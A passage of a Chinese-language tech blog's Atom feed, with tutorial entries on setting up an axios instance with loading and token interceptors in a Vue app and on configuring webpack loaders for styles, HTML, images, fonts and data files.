pendingMap=new Map();</span></span><br><span class="line"><span class="comment">//axios.defaults.headers.post[&#x27;Content-Type&#x27;] = &#x27;application/x-www-form-urlencoded;charset=UTF-8&#x27;;</span></span><br><span class="line"><span class="comment">//创建一个axios实例</span></span><br><span class="line"><span class="keyword">var</span> instance=axios.create(&#123;</span><br><span class="line">    <span class="attr">baseURL</span>:<span class="string">&quot;http://127.0.0.1:3007&quot;</span>,</span><br><span class="line">    <span class="attr">timeout</span>: <span class="number">10000</span>,<span class="comment">//设置超时</span></span><br><span class="line">    <span class="attr">headers</span>:&#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">let</span> loading;</span><br><span class="line"><span class="comment">//多次请求时</span></span><br><span class="line"><span class="keyword">let</span> requestCount=<span class="number">0</span>;</span><br><span class="line"><span class="comment">//显示Loading</span></span><br><span class="line"><span class="keyword">const</span> showLoading=<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(requestCount===<span class="number">0</span>&amp;&amp;!loading)&#123;<span class="comment">//第一次发送请求并且没有loading加载loaing</span></span><br><span class="line">        loading=ElLoading.service(&#123;</span><br><span class="line">            <span class="attr">text</span>:<span class="string">&#x27;Loading&#x27;</span>,</span><br><span class="line">            <span class="attr">background</span>:<span class="string">&#x27;rgba(0,0,0,0.7)&#x27;</span>,</span><br><span class="line">            <span class="attr">spinner</span>:<span class="string">&#x27;el-icon-loading&#x27;</span>,</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    requestCount++;<span class="comment">//多次请求</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//隐藏loading</span></span><br><span class="line"><span class="keyword">const</span> hideLoading=<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    requestCount--;</span><br><span class="line">    <span class="keyword">if</span>(requestCount===<span class="number">0</span>)&#123;</span><br><span class="line">        loading.close()<span class="comment">//直到请求都结束Loading才关闭</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//请求拦截器</span></span><br><span class="line">instance.interceptors.request.use(<span class="function">(<span class="params">config</span>)=&gt;</span>&#123;</span><br><span class="line">    showLoading()</span><br><span class="line">    <span class="comment">//每次发送请求前判断是否存在token如果存在则在header加上token</span></span><br><span class="line">    <span class="keyword">const</span> token=<span class="built_in">window</span>.localStorage.getItem(<span class="string">&#x27;token&#x27;</span>);</span><br><span class="line">    token&amp;&amp;(config.headers.Authorization=token)</span><br><span class="line">    <span class="keyword">return</span> config;</span><br><span class="line">&#125;,<span class="function">(<span class="params">error</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">Promise</span>.reject(error);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//响应拦截器</span></span><br><span class="line">instance.interceptors.response.use(<span class="function">(<span class="params">response</span>)=&gt;</span>&#123;</span><br><span class="line">    hideLoading()</span><br><span class="line">    <span class="comment">//响应成功</span></span><br><span class="line">   <span class="comment">// console.log(&#x27;拦截器报错&#x27;)</span></span><br><span class="line">   <span class="comment">// console.log(response)</span></span><br><span class="line">    <span class="keyword">const</span> status=response.data.status;</span><br><span class="line">    <span class="keyword">if</span>(status!=<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">switch</span>(status)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>: <span class="comment">//响应成功后如果是登录成功有token把token存储在本地</span></span><br><span class="line">                <span class="keyword">if</span>(response.data.token!=<span class="literal">undefined</span>)<span class="built_in">window</span>.localStorage.setItem(<span class="string">&#x27;token&#x27;</span>,response.data.token);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">200</span>:<span class="comment">//获取用户信息成功后存储在localStorage里和store</span></span><br><span class="line">                <span class="built_in">console</span>.log(response.data);</span><br><span class="line">                store.commit(<span class="string">&quot;saveUserInfo&quot;</span>,(response.data).data);</span><br><span class="line">                <span class="built_in">window</span>.localStorage.setItem(<span class="string">&#x27;userInfo&#x27;</span>,<span class="built_in">JSON</span>.stringify((response.data).data));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">401</span>:<span class="comment">//登录过期跳转到登录页面</span></span><br><span class="line">            <span class="keyword">case</span> <span class="number">201</span>:<span class="comment">//退出登录清空token跳转登录页面                </span></span><br><span class="line">                <span class="built_in">window</span>.localStorage.removeItem(<span class="string">&#x27;token&#x27;</span>);</span><br><span class="line">                <span class="built_in">window</span>.localStorage.removeItem(<span class="string">&#x27;userInfo&#x27;</span>)</span><br><span class="line">                CHAT.logout();</span><br><span class="line">                router.push(<span class="string">&quot;/login&quot;</span>);  </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(response.data.message)ElMessage.success(response.data.message)           </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Promise</span>.resolve(response); </span><br><span class="line">    &#125;</span><br><span class="line">     <span class="keyword">else</span> &#123;       </span><br><span class="line">        ElMessage.error(response.data.message);            </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Promise</span>.reject(response);        </span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">&#125;,<span class="function">(<span class="params">error</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(error);</span><br><span class="line">    <span class="comment">//响应错误</span></span><br><span class="line">    <span class="keyword">if</span>(error.response&amp;&amp;error.response.status)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Promise</span>.reject(error)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Promise</span>.reject(error);</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> instance;</span><br></pre></td></tr></table></figure><h2 id="request-js"><a href="#request-js" class="headerlink" title="request.js"></a>request.js</h2><p>request.js中使用axios实例</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> instance <span class="keyword">from</span> <span class="string">&quot;./index&quot;</span></span><br><span class="line"><span class="keyword">const</span> axios=<span class="function">(<span class="params">&#123;</span></span></span><br><span class="line"><span class="params"><span class="function">    method,</span></span></span><br><span class="line"><span class="params"><span class="function">    url,</span></span></span><br><span class="line"><span class="params"><span class="function">    data,</span></span></span><br><span class="line"><span class="params"><span class="function">    config</span></span></span><br><span class="line"><span class="params"><span class="function">&#125;</span>)=&gt;</span>&#123;</span><br><span class="line">    method=method.toLowerCase();</span><br><span class="line">    <span class="keyword">if</span>(method==<span class="string">&#x27;post&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> instance.post(url,data,&#123;...config&#125;)</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(method==<span class="string">&#x27;get&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> instance.get(url,&#123;</span><br><span class="line">            <span class="attr">params</span>:data,</span><br><span class="line">            ...config</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(method==<span class="string">&#x27;delete&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> instance.delete(url,&#123;</span><br><span class="line">            <span class="attr">params</span>:data,</span><br><span class="line">            ...config</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(method==<span class="string">&#x27;put&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> instance.put(url,data,&#123;...config&#125;)</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;未知的方法&#x27;</span>+method)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> axios</span><br></pre></td></tr></table></figure><h2 id="api-js"><a href="#api-js" class="headerlink" title="api.js"></a>api.js</h2><p>api.js用来封装各种类型的请求</p><p>默认情况下，axios 将 JavaScript 对象序列化为<code>JSON</code>. 要改为以格式发送数据<code>application/x-www-form-urlencoded</code>，我用的是qs.stringfy将数据转换，其他方法可以参考官网</p><p>[]: <a href="https://axios-http.com/docs/urlencoded">https://axios-http.com/docs/urlencoded</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&quot;./request&quot;</span></span><br><span class="line"><span class="keyword">import</span> qs <span class="keyword">from</span> <span class="string">&quot;qs&quot;</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> login=<span class="function">(<span class="params">data</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> axios(&#123;</span><br><span class="line">        <span class="attr">url</span>:<span class="string">&#x27;/api/login&#x27;</span>,</span><br><span class="line">        <span class="attr">method</span>:<span class="string">&#x27;post&#x27;</span>,</span><br><span class="line">        <span class="attr">data</span>:qs.stringify(data),</span><br><span class="line">         </span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> register=<span class="function">(<span class="params">data</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> axios(&#123;</span><br><span class="line">        <span class="attr">url</span>:<span class="string">&#x27;/api/register&#x27;</span>,</span><br><span class="line">        <span class="attr">method</span>:<span class="string">&#x27;post&#x27;</span>,</span><br><span class="line">        <span class="attr">data</span>:qs.stringify(data)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> logout=<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> axios(&#123;</span><br><span class="line">        <span class="attr">url</span>:<span class="string">&#x27;/api/logout&#x27;</span>,</span><br><span class="line">        <span class="attr">method</span>:<span class="string">&#x27;post&#x27;</span>,</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> getUserInfo=<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> axios(&#123;</span><br><span class="line">        <span class="attr">url</span>:<span class="string">&#x27;/my/getUserInfo&#x27;</span>,</span><br><span class="line">        <span class="attr">method</span>:<span class="string">&#x27;get&#x27;</span>,</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> updatePassword=<span class="function">(<span class="params">data</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> axios(&#123;</span><br><span class="line">        <span class="attr">url</span>:<span class="string">&#x27;/my/updatePassword&#x27;</span>,</span><br><span class="line">        <span class="attr">method</span>:<span class="string">&#x27;post&#x27;</span>,</span><br><span class="line">        <span class="attr">data</span>:qs.stringify(data)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在src文件夹中新创建一个utils文件夹，创建index.js来实现axios实例，并配置拦截器&lt;/p&gt;
&lt;h2 id=&quot;index-js&quot;&gt;&lt;a href=&quot;#index-js&quot; class=&quot;headerlink&quot; title=&quot;index.js&quot;&gt;&lt;/a&gt;index</summary>
      
    
    
    
    <category term="Node" scheme="https://coloey.github.io/categories/Node/"/>
    
    <category term="Vue" scheme="https://coloey.github.io/categories/Node/Vue/"/>
    
    
  </entry>
  
  <entry>
    <title>打包资源</title>
    <link href="https://coloey.github.io/2022/04/10/%E6%89%93%E5%8C%85%E8%B5%84%E6%BA%90/"/>
    <id>https://coloey.github.io/2022/04/10/%E6%89%93%E5%8C%85%E8%B5%84%E6%BA%90/</id>
    <published>2022-04-10T09:30:58.000Z</published>
    <updated>2022-04-11T06:50:45.747Z</updated>
    
    <content type="html"><![CDATA[<h1 id="打包样式资源"><a href="#打包样式资源" class="headerlink" title="打包样式资源"></a>打包样式资源</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;resolve&#125; =<span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line"><span class="built_in">module</span>.exports=&#123;</span><br><span class="line">    <span class="attr">entry</span>:<span class="string">&#x27;./src/index.js&#x27;</span>,</span><br><span class="line">    <span class="comment">//输出</span></span><br><span class="line">    <span class="attr">output</span>:&#123;</span><br><span class="line">        <span class="comment">//输出文件名</span></span><br><span class="line">        <span class="attr">filename</span>:<span class="string">&#x27;built.js&#x27;</span>,</span><br><span class="line">        <span class="comment">//输出路径,_dirname node.js的变量，代表当前文件的目录绝对路径</span></span><br><span class="line">        <span class="attr">path</span>:resolve(__dirname,<span class="string">&#x27;build&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">//loader配置</span></span><br><span class="line">    <span class="attr">module</span>:&#123;</span><br><span class="line">        <span class="attr">rules</span>:[</span><br><span class="line">            <span class="comment">//匹配哪些文件</span></span><br><span class="line">            &#123;<span class="attr">test</span>:<span class="regexp">/\.css$/</span>,</span><br><span class="line">            <span class="comment">//使用哪些loader</span></span><br><span class="line">            use:[</span><br><span class="line">                <span class="comment">//use数组中loader执行顺序从右到左，从下到上一次执行</span></span><br><span class="line">                <span class="comment">//创建style标签，将js中的样式资源插入进行，添加到head中生效</span></span><br><span class="line">                <span class="string">&#x27;style-loader&#x27;</span>,</span><br><span class="line">                <span class="comment">//将css文件变成commonjs模块加载到js中，里面内容是样式字符串</span></span><br><span class="line">                <span class="string">&#x27;css-loader&#x27;</span></span><br><span class="line">            ]&#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">test</span>:<span class="regexp">/\.less$/</span>,</span><br><span class="line">                use:[</span><br><span class="line">                    <span class="string">&#x27;style-loader&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;css-loader&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;less-loader&#x27;</span>,<span class="comment">//将less文件编译成css文件</span></span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">plugins</span>:[</span><br><span class="line">        </span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">mode</span>:<span class="string">&#x27;development&#x27;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="打包html资源"><a href="#打包html资源" class="headerlink" title="打包html资源"></a>打包html资源</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;resolve&#125; =<span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> HtmlWebpackPlugin=<span class="built_in">require</span>(<span class="string">&#x27;html-webpack-plugin&#x27;</span>)</span><br><span class="line"><span class="built_in">module</span>.exports=&#123;</span><br><span class="line">    <span class="attr">entry</span>:<span class="string">&#x27;./src/index.js&#x27;</span>,</span><br><span class="line">    <span class="comment">//输出</span></span><br><span class="line">    <span class="attr">output</span>:&#123;</span><br><span class="line">        <span class="comment">//输出文件名</span></span><br><span class="line">        <span class="attr">filename</span>:<span class="string">&#x27;built.js&#x27;</span>,</span><br><span class="line">        <span class="comment">//输出路径,_dirname node.js的变量，代表当前文件的目录绝对路径</span></span><br><span class="line">        <span class="attr">path</span>:resolve(__dirname,<span class="string">&#x27;build&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">//loader配置</span></span><br><span class="line">    <span class="attr">module</span>:&#123;</span><br><span class="line">        <span class="attr">rules</span>:[</span><br><span class="line">            <span class="comment">//匹配哪些文件</span></span><br><span class="line">            &#123;<span class="attr">test</span>:<span class="regexp">/\.css$/</span>,</span><br><span class="line">            <span class="comment">//使用哪些loader</span></span><br><span class="line">            use:[</span><br><span class="line">                <span class="comment">//use数组中loader执行顺序从右到左，从下到上一次执行</span></span><br><span class="line">                <span class="comment">//创建style标签，将js中的样式资源插入进行，添加到head中生效</span></span><br><span class="line">                <span class="string">&#x27;style-loader&#x27;</span>,</span><br><span class="line">                <span class="comment">//将css文件变成commonjs模块加载到js中，里面内容是样式字符串</span></span><br><span class="line">                <span class="string">&#x27;css-loader&#x27;</span></span><br><span class="line">            ]&#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">test</span>:<span class="regexp">/\.less$/</span>,</span><br><span class="line">                use:[</span><br><span class="line">                    <span class="string">&#x27;style-loader&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;css-loader&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;less-loader&#x27;</span>,<span class="comment">//将less文件编译成css文件</span></span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">plugins</span>:[</span><br><span class="line">        <span class="comment">//html-webpack-plugin默认会创建一个空的HTML,自动引入打包输出的所有资源（js/css）</span></span><br><span class="line">        <span class="comment">//需求：需要有结构的HTML文件</span></span><br><span class="line">        <span class="keyword">new</span> HtmlWebpackPlugin(&#123;</span><br><span class="line">            <span class="comment">//模板比对&#x27;src/index.html&#x27;文件，并自动引入打包输出的所有资源(js/css)</span></span><br><span class="line">            <span class="attr">template</span>:<span class="string">&#x27;./src/index.html&#x27;</span></span><br><span class="line">        &#125;)</span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">mode</span>:<span class="string">&#x27;development&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="打包图片"><a href="#打包图片" class="headerlink" title="打包图片"></a>打包图片</h1><p> <a href="https://webpack.docschina.org/loaders/html-loader">html-loader</a> 以相同的方式处理 <code>&lt;img src=&quot;./my-image.png&quot; /&gt;</code>。需要npm i html-wepack-plugin</p><p>[]: <a href="https://webpack.docschina.org/loaders/html-loader">https://webpack.docschina.org/loaders/html-loader</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//处理图片</span></span><br><span class="line">          &#123;</span><br><span class="line">              <span class="attr">test</span>:<span class="regexp">/\.(png|svg|jpg|jpeg|gif)$/i</span>,</span><br><span class="line">              type:<span class="string">&#x27;asset/resource&#x27;</span>,</span><br><span class="line"></span><br><span class="line">          &#125;,</span><br><span class="line">             <span class="comment">//将html导出为字符串</span></span><br><span class="line">          &#123;</span><br><span class="line">              <span class="attr">test</span>:<span class="regexp">/\.html$/i</span>,</span><br><span class="line">              loader:<span class="string">&quot;html-loader&quot;</span>,</span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="comment">//处理字体</span></span><br><span class="line">          &#123;</span><br><span class="line">              <span class="attr">test</span>:<span class="regexp">/\.(woff|woff2|eot|ttf|otf)$/i</span>,</span><br><span class="line">              type:<span class="string">&#x27;asset/resource&#x27;</span></span><br><span class="line">          &#125;,</span><br></pre></td></tr></table></figure><h1 id="打包xml-csv文件"><a href="#打包xml-csv文件" class="headerlink" title="打包xml,csv文件"></a>打包xml,csv文件</h1><p>可以加载的有用资源还有数据，如 JSON 文件，CSV、TSV 和 XML。类似于 NodeJS，JSON 支持实际上是内置的，也就是说 <code>import Data from &#39;./data.json&#39;</code> 默认将正常运行。要导入 CSV、TSV 和 XML，你可以使用 <a href="https://github.com/theplatapi/csv-loader">csv-loader</a> 和 <a href="https://github.com/gisikw/xml-loader">xml-loader</a>。让我们处理加载这三类文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save-dev csv-loader xml-loader</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">      <span class="attr">test</span>: <span class="regexp">/\.(csv|tsv)$/i</span>,</span><br><span class="line">      use: [<span class="string">&#x27;csv-loader&#x27;</span>],</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">test</span>: <span class="regexp">/\.xml$/i</span>,</span><br><span class="line">      use: [<span class="string">&#x27;xml-loader&#x27;</span>],</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure><h1 id="打包toml-yaml-json5"><a href="#打包toml-yaml-json5" class="headerlink" title="打包toml,yaml,json5"></a>打包toml,yaml,json5</h1><p>通过使用 <a href="https://webpack.docschina.org/configuration/module/#ruleparserparse">自定义 parser</a> 替代特定的 webpack loader，可以将任何 <code>toml</code>、<code>yaml</code> 或 <code>json5</code> 文件作为 JSON 模块导入。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install toml yamljs json5 --save-dev</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">const</span> toml=<span class="built_in">require</span>(<span class="string">&#x27;toml&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> yaml=<span class="built_in">require</span>(<span class="string">&#x27;yamljs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> json5=<span class="built_in">require</span>(<span class="string">&#x27;json5&#x27;</span>)</span><br><span class="line">...</span><br><span class="line">&#123;</span><br><span class="line">        <span class="attr">test</span>: <span class="regexp">/\.toml$/i</span>,</span><br><span class="line">        type: <span class="string">&#x27;json&#x27;</span>,</span><br><span class="line">        <span class="attr">parser</span>: &#123;</span><br><span class="line">          <span class="attr">parse</span>: toml.parse,</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">test</span>: <span class="regexp">/\.yaml$/i</span>,</span><br><span class="line">        type: <span class="string">&#x27;json&#x27;</span>,</span><br><span class="line">        <span class="attr">parser</span>: &#123;</span><br><span class="line">          <span class="attr">parse</span>: yaml.parse,</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">test</span>: <span class="regexp">/\.json5$/i</span>,</span><br><span class="line">        type: <span class="string">&#x27;json&#x27;</span>,</span><br><span class="line">        <span class="attr">parser</span>: &#123;</span><br><span class="line">          <span class="attr">parse</span>: json5.parse,</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;,</span><br></pre></td></tr></table></figure><h1 id="清理-dist文件"><a href="#清理-dist文件" class="headerlink" title="清理/dist文件"></a>清理/dist文件</h1><p>在每次构建前清理 <code>/dist</code> 文件夹，这样只会生成用到的文件。让我们使用 <a href="https://webpack.docschina.org/configuration/output/#outputclean"><code>output.clean</code></a> 配置项实现这个需求。</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">const path = require(&#x27;path&#x27;);</span><br><span class="line"> const HtmlWebpackPlugin = require(&#x27;html-webpack-plugin&#x27;);</span><br><span class="line"></span><br><span class="line"> module.exports = &#123;</span><br><span class="line">   entry: &#123;</span><br><span class="line">     index: &#x27;./src/index.js&#x27;,</span><br><span class="line">     print: &#x27;./src/print.js&#x27;,</span><br><span class="line">   &#125;,</span><br><span class="line">   plugins: [</span><br><span class="line">     new HtmlWebpackPlugin(&#123;</span><br><span class="line">       title: &#x27;Output Management&#x27;,</span><br><span class="line">     &#125;),</span><br><span class="line">   ],</span><br><span class="line">   output: &#123;</span><br><span class="line">     filename: &#x27;[name].bundle.js&#x27;,</span><br><span class="line">     path: path.resolve(__dirname, &#x27;dist&#x27;),</span><br><span class="line"><span class="addition">+    clean: true,</span></span><br><span class="line">   &#125;,</span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;打包样式资源&quot;&gt;&lt;a href=&quot;#打包样式资源&quot; class=&quot;headerlink&quot; title=&quot;打包样式资源&quot;&gt;&lt;/a&gt;打包样式资源&lt;/h1&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter</summary>
      
    
    
    
    <category term="webpack" scheme="https://coloey.github.io/categories/webpack/"/>
    
    
  </entry>
  
  <entry>
    <title>wepack五个核心概念</title>
    <link href="https://coloey.github.io/2022/04/10/wepack%E4%BA%94%E4%B8%AA%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5/"/>
